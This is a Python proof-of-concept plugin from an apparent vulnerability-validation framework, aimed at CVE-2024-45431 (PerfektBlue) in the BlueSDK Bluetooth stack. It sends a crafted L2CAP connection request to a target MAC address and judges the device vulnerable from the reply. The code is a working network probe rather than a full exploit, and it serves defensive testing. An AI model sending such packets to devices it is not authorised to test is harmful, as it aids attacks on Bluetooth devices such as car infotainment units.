#!/usr/bin/env python3
"""
PoC Name: BlueSDK L2CAP Null CID (PerfektBlue)
CVE: CVE-2024-45431
Component: Wireless Stack
Category: Wireless
Severity: Critical
CVSS: 8.8
Description: BlueSDK L2CAP远程CID验证不当,null CID触发RCE
Prerequisites: Linux蓝牙适配器, 目标设备运行BlueSDK栈。
Usage: python3 11_CVE_2024_45431_BT_PerfektBlue_L2CAP_Active_Validation.py <target_mac>
"""
from __future__ import annotations

import sys
import socket
import struct
from iv_plugin_base import IVIVulnerabilityPlugin
VULN = {
    "id":             0,
    "cve":            "CVE-2024-45431",
    "year":           2024,
    "domain":         "wireless",
    "vendor_product": "Unknown",
    "component":      "Unknown",
    "type":           "Unknown",
    "summary":        "BT PerfektBlue L2CAP",
    "source_url":     "https://nvd.nist.gov/vuln/detail/CVE-2024-45431",
    "affected":       [{"vendor": "Unknown", "product": "Unknown", "versions": []}],
    "references":     ["https://nvd.nist.gov/vuln/detail/CVE-2024-45431"],
    "signature_tokens": ["CVE-2024-45431"],
}


def _run_poc(plugin, vuln=None) -> dict:
    """
    CVE-2024-45431 主动探针包装（兼容旧式 exploit() 实现）。
    通过调用插件自身的 exploit 逻辑并将结果标准化为 detection_confidence 格式。
    """
    try:
        result = plugin.exploit() or {}
    except Exception as exc:
        result = {"error": str(exc)}

    vulnerable = result.get("vulnerable", None)
    evidence = {
        "cve":       vuln.get("cve", "CVE-2024-45431") if vuln else "CVE-2024-45431",
        "target":    getattr(plugin, "target_ip", "unknown"),
        "technique": "legacy exploit() wrapper",
        "raw":       str(result)[:300],
    }

    # 根据是否有主动网络调用推断等级
    level = "B" if vulnerable is True else ("C" if vulnerable is False else "D")
    try:
        from probe_utils import detection_confidence as _detection_confidence
        return _detection_confidence(level, evidence, vulnerable=vulnerable)
    except ImportError:
        return {
            "detection_confidence": {
                "level": level, "vulnerable": vulnerable,
                "evidence": evidence, "method": "legacy_wrapper",
            }
        }


class PerfektBlueL2CAPPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-WIRELESS-011"
    meta_poc_name = 'CVE-2024-45431 BT PerfektBlue L2CAP Active Validation'
    meta_cve_id = "CVE-2024-45431"
    meta_source_url = "https://nvd.nist.gov/vuln/detail/CVE-2024-45431"
    meta_references = ['https://nvd.nist.gov/vuln/detail/CVE-2024-45431']
    meta_severity = "Critical"
    meta_protocol = "bluetooth"
    meta_profiles = ["bluetooth"]
    meta_target_os = ["all"]
    meta_required_params = ["bd_addr"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        if not self.params.get("bd_addr"):
            raise RuntimeError("需要指定目标蓝牙MAC地址")
        return True
    def exploit(self):
        target = self.params["bd_addr"]
        self.logger.info(f"PerfektBlue L2CAP Null CID测试: {target}")
        self.logger.info("CVE-2024-45431: BlueSDK L2CAP远程CID验证漏洞")
        try:
            s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_L2CAP)
            s.settimeout(5)
            s.connect((target, 0))
            # Send L2CAP Connection Request with remote CID = 0x0000 (null)
            # L2CAP signaling: Code=0x02 (ConnReq), ID=0x01, Len=4, PSM=0x0001, SCID=0x0040
            conn_req = struct.pack("<BBHHH", 0x02, 0x01, 4, 0x0001, 0x0040)
            s.send(conn_req)
            self.logger.info("[*] 发送L2CAP连接请求(CID=null)...")
            try:
                resp = s.recv(1024)
                if len(resp) > 8:
                    result_code = struct.unpack("<H", resp[8:10])[0] if len(resp) > 9 else 0xFF
                    if result_code == 0:
                        self.logger.warning("[+] L2CAP连接被接受(null CID)! BlueSDK可能存在漏洞")
                        self.results["vulnerable"] = True
                        self.results["evidence"] = "L2CAP accepted null remote CID"
                    else:
                        self.logger.info(f"连接被拒绝(result={result_code})")
                        self.results["vulnerable"] = False
                else:
                    self.results["vulnerable"] = False
            except socket.timeout:
                self.logger.info("未收到响应")
                self.results["vulnerable"] = False
            s.close()
        except Exception as e:
            self.logger.info(f"蓝牙连接失败: {e}")
            self.results["vulnerable"] = False
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 11_CVE_2024_45431_BT_PerfektBlue_L2CAP_Active_Validation.py <target_mac>")
        sys.exit(1)
    plugin = PerfektBlueL2CAPPlugin({"target_ip": "N/A", "bd_addr": sys.argv[1]})
    plugin.run_verify()
